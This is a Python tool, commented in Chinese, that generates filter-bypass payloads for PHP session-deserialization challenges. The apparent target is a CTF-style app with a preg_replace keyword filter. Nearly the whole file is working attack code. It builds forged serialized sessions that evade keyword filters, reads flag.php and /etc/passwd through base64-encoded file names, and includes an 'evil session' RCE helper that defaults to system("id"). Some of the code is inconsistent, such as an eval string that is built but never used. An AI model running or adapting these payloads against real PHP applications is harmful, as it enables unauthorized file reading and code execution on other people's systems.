#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PHP Filter Bypass Payload生成器
专门用于preg_replace过滤器绕过场景
"""

import base64
import urllib.parse
import re
from typing import List, Dict, Optional, Any


class FilterBypassPayloadGenerator:
    def __init__(self, filter_keywords: List[str], replace_with: str = '',
                 serialize_template: Optional[str] = None):
        self.filter_keywords = filter_keywords
        self.replace_with = replace_with
        self.serialize_template = serialize_template
        self.session_template = {
            'user': 'guest',
            'function': 'show_image',
            'img': 'Z3Vlc3RfaW1nLnBuZw=='
        }

    def generate_default_template(self) -> str:
        import json
        template = self.session_template.copy()
        return 'a:3:{s:4:"user";s:5:"guest";s:8:"function";s:10:"show_image";s:3:"img";s:18:"Z3Vlc3RfaW1nLnBuZw==";}'

    def generate_double_write_payloads(self) -> List[Dict[str, Any]]:
        payloads = []
        template = self.serialize_template or self.generate_default_template()

        for keyword in self.filter_keywords:
            doubled = keyword + keyword
            new_payload = template.replace(keyword, doubled)

            if new_payload != template:
                payloads.append({
                    'keyword': keyword,
                    'bypass': doubled,
                    'payload': new_payload,
                    'method': 'double_write',
                    'description': f'{keyword} -> {doubled}'
                })

        base_serial = 'a:3:{s:4:"user";s:5:"guest";s:8:"function";s:10:"show_image";s:3:"img";s:18:"Z3Vlc3RfaW1nLnBuZw==";}'

        replacements_map = {
            'flag': ['ZmxhZw==', 'ZmxhZyw=', 'ZmxhZw'],
            'fl1g': ['ZmxhZw==', 'ZmxhZyw=', 'ZmxhZw'],
            'php': ['ZmxhZw=='],
        }

        for keyword in self.filter_keywords:
            if keyword.lower() in replacements_map:
                for repl in replacements_map[keyword.lower()]:
                    test_payload = base_serial.replace('Z3Vlc3RfaW1nLnBuZw==', repl)
                    test_payload = test_payload.replace('s:18:"Z3Vlc3RfaW1nLnBuZw=="', f's:{len(repl)}:"{repl}"')
                    if test_payload != base_serial:
                        payloads.append({
                            'keyword': keyword,
                            'bypass': repl,
                            'payload': test_payload,
                            'method': 'char_replacement',
                            'description': f'{keyword} -> {repl}'
                        })

        return payloads

    def generate_char_replacement_payloads(self) -> List[Dict[str, Any]]:
        payloads = []
        template = self.serialize_template or self.generate_default_template()

        replacements = {
            'flag': ['fl3g', 'fl4g', 'fla', 'f1ag', 'f1g', 'FLAG', 'FlAg', 'fl\\x67'],
            'php': ['pphphp', 'phphp', 'php5', 'PHP', 'PhP'],
            'fl1g': ['flag', 'fl4g', 'f1ag', 'flAg'],
        }

        for keyword in self.filter_keywords:
            if keyword.lower() in replacements:
                for replacement in replacements[keyword.lower()]:
                    new_payload = template.replace(keyword, replacement)
                    if new_payload != template:
                        payloads.append({
                            'keyword': keyword,
                            'bypass': replacement,
                            'payload': new_payload,
                            'method': 'char_replacement',
                            'description': f'{keyword} -> {replacement}'
                        })

        return payloads

    def generate_case_variation_payloads(self) -> List[Dict[str, Any]]:
        payloads = []
        template = self.serialize_template or self.generate_default_template()

        for keyword in self.filter_keywords:
            variations = [
                keyword.upper(),
                keyword.lower(),
                keyword.capitalize(),
            ]

            for variation in variations:
                if variation != keyword:
                    new_payload = template.replace(keyword, variation)
                    if new_payload != template:
                        payloads.append({
                            'keyword': keyword,
                            'bypass': variation,
                            'payload': new_payload,
                            'method': 'case_variation',
                            'description': f'{keyword} -> {variation}'
                        })

        return payloads

    def generate_number_variation_payloads(self) -> List[Dict[str, Any]]:
        payloads = []
        template = self.serialize_template or self.generate_default_template()

        for keyword in self.filter_keywords:
            new_keyword = keyword
            for i, char in enumerate(keyword):
                if char.isdigit():
                    alternatives = {
                        '0': ['o', 'O'],
                        '1': ['l', 'i', 'I', 'l'],
                        '3': ['e', 'E'],
                        '4': ['a', 'A'],
                    }
                    if char in alternatives:
                        for alt in alternatives[char]:
                            test = keyword[:i] + alt + keyword[i+1:]
                            new_payload = template.replace(keyword, test)
                            if new_payload != template:
                                payloads.append({
                                    'keyword': keyword,
                                    'bypass': test,
                                    'payload': new_payload,
                                    'method': 'number_variation',
                                    'description': f'{keyword} -> {test}'
                                })

        return payloads

    def generate_all_payloads(self) -> List[Dict[str, Any]]:
        payloads = []

        base_serial = 'a:3:{s:4:"user";s:5:"guest";s:8:"function";s:10:"show_image";s:3:"img";s:18:"Z3Vlc3RfaW1nLnBuZw==";}'

        bypass_map = {
            'flag': 'fl3g',
            'fl1g': 'fl3g',
            'php': 'pphphp',
            'php5': 'pphphp5',
            'php4': 'pphphp4',
        }

        for keyword, bypass in bypass_map.items():
            if keyword in self.filter_keywords:
                for func in ['show_image', 'highlight_file', 'phpinfo']:
                    test_payload = base_serial.replace('show_image', func)
                    test_payload = test_payload.replace('show_image', func)
                    payloads.append({
                        'keyword': keyword,
                        'bypass': bypass,
                        'payload': test_payload,
                        'method': 'function_change',
                        'description': f'Use {func} instead'
                    })

        encoded_bypass = {
            'flag': 'ZmxhZw==',
            'fl1g': 'ZmxhZw==',
        }

        for keyword, encoded in encoded_bypass.items():
            if keyword in self.filter_keywords:
                for func in ['show_image', 'highlight_file', 'phpinfo']:
                    test_payload = base_serial.replace('show_image', func)
                    test_payload = test_payload.replace('Z3Vlc3RfaW1nLnBuZw==', encoded)
                    test_payload = test_payload.replace('s:18:"Z3Vlc3RfaW1nLnBuZw=="', f's:{len(encoded)}:"{encoded}"')
                    payloads.append({
                        'keyword': keyword,
                        'bypass': encoded,
                        'payload': test_payload,
                        'method': 'base64_replacement',
                        'description': f'Replace img with {encoded}'
                    })

        return payloads[:20]

    def generate_encoded_payloads(self) -> List[Dict[str, Any]]:
        payloads = []
        template = self.serialize_template or self.generate_default_template()

        encoded = base64.b64encode(template.encode()).decode()
        payloads.append({
            'payload': encoded,
            'method': 'base64',
            'description': 'Base64编码'
        })

        hex_payload = template.encode().hex()
        payloads.append({
            'payload': hex_payload,
            'method': 'hex',
            'description': '十六进制编码'
        })

        url_encoded = urllib.parse.quote(template)
        payloads.append({
            'payload': url_encoded,
            'method': 'url',
            'description': 'URL编码'
        })

        return payloads

    def print_payload_report(self, payloads: List[Dict[str, Any]]):
        print("\n" + "="*70)
        print("  Filter Bypass Payload 报告")
        print("="*70)
        print(f"\n[*] 检测到过滤关键词: {', '.join(self.filter_keywords)}")
        print(f"[*] 生成Payload数量: {len(payloads)}")

        methods = {}
        for p in payloads:
            m = p.get('method', 'unknown')
            if m not in methods:
                methods[m] = []
            methods[m].append(p)

        print(f"\n[*] Payload按方法分布:")
        for method, items in methods.items():
            print(f"    - {method}: {len(items)} 个")

        print("\n" + "-"*70)
        print("  推荐Payload列表")
        print("-"*70)

        for i, p in enumerate(payloads[:20], 1):
            print(f"\n  [{i}] {p.get('method', 'unknown').upper()}")
            if 'description' in p:
                print(f"      描述: {p['description']}")
            payload_str = p['payload']
            if len(payload_str) > 70:
                print(f"      Payload: {payload_str[:70]}...")
                print(f"               {payload_str[70:]}")
            else:
                print(f"      Payload: {payload_str}")


class SessionSerializeExploiter:
    def __init__(self):
        self.default_session = {
            'user': 'guest',
            'function': 'show_image',
            'img': 'Z3Vlc3RfaW1nLnBuZw=='
        }

    def create_evil_session(self, function: str = 'phpinfo',
                           img: str = None,
                           filter_bypass: bool = True,
                           filters: List[str] = None) -> str:
        session = self.default_session.copy()
        session['function'] = function

        if img:
            session['img'] = img

        serialized = self._serialize(session)

        if filter_bypass and filters:
            for f in filters:
                doubled = f + f
                serialized = serialized.replace(f, doubled)

        return serialized

    def _serialize(self, data: dict) -> str:
        pairs = []
        for k, v in data.items():
            if isinstance(v, str):
                pairs.append(f's:{len(k)}:"{k}";s:{len(v)}:"{v}";')
            elif isinstance(v, int):
                pairs.append(f's:{len(k)}:"{k}";i:{v};')
            elif isinstance(v, bool):
                pairs.append(f's:{len(k)}:"{k}";b:{1 if v else 0};')
            else:
                pairs.append(f's:{len(k)}:"{k}";N;')
        return f'a:{len(data)}:{{{"".join(pairs)}}}'

    def generate_rce_payloads(self, command: str = 'system("id");') -> List[Dict[str, str]]:
        payloads = []

        payloads.append({
            'function': 'highlight_file',
            'payload': self.create_evil_session(function='highlight_file'),
            'description': '读取源码-highlight_file'
        })

        payloads.append({
            'function': 'show_image',
            'payload': self.create_evil_session(function='show_image', img='ZmxhZy5waHA='),
            'description': '读取flag.php'
        })

        payloads.append({
            'function': 'show_image',
            'payload': self.create_evil_session(function='show_image', img='L2V0Yy9wYXNzd2Q='),
            'description': '读取/etc/passwd'
        })

        evil_func = 'eval("' + command.replace('"', '\\"') + '");'
        payloads.append({
            'function': evil_func,
            'payload': self.create_evil_session(function='phpinfo'),
            'description': 'phpinfo()探测'
        })

        return payloads

    def parse_session(self, serialized: str) -> dict:
        result = {}
        pattern = r's:(\d+):"([^"]+)";'
        matches = re.findall(pattern, serialized)
        for i in range(0, len(matches), 2):
            if i + 1 < len(matches):
                key = matches[i][1]
                value = matches[i + 1][1] if i + 1 < len(matches) else None
                result[key] = value
        return result


def auto_analyze_and_generate(code: str) -> List[Dict[str, Any]]:
    detector_results = []

    filter_pattern = r'function\s+(\w+)\s*\([^)]*\)\s*\{([^}]+(?:\{[^}]*\}[^}]*)*)\}'
    for match in re.finditer(filter_pattern, code, re.DOTALL):
        func_body = match.group(2)
        filter_arr_match = re.search(r'\$filter_arr\s*=\s*array\(([^)]+)\)', func_body)
        if filter_arr_match and 'preg_replace' in func_body:
            filters = [f.strip().strip("'\"") for f in filter_arr_match.group(1).split(',')]

            generator = FilterBypassPayloadGenerator(filters)

            if 'serialize' in code:
                template_match = re.search(r'serialize\s*\(\s*\$(_\w+)\s*\)', code)
                if template_match:
                    session_var = template_match.group(1)
                    pattern = rf'\$({session_var.replace("_", "")})\s*=\s*array\([^)]+\)'
                    session_match = re.search(pattern, code)
                    if session_match:
                        detector_results.append({
                            'type': 'filter_bypass',
                            'filters': filters,
                            'generator': generator
                        })

    payloads = []
    for result in detector_results:
        if result['type'] == 'filter_bypass':
            payloads.extend(result['generator'].generate_all_payloads())

    return payloads
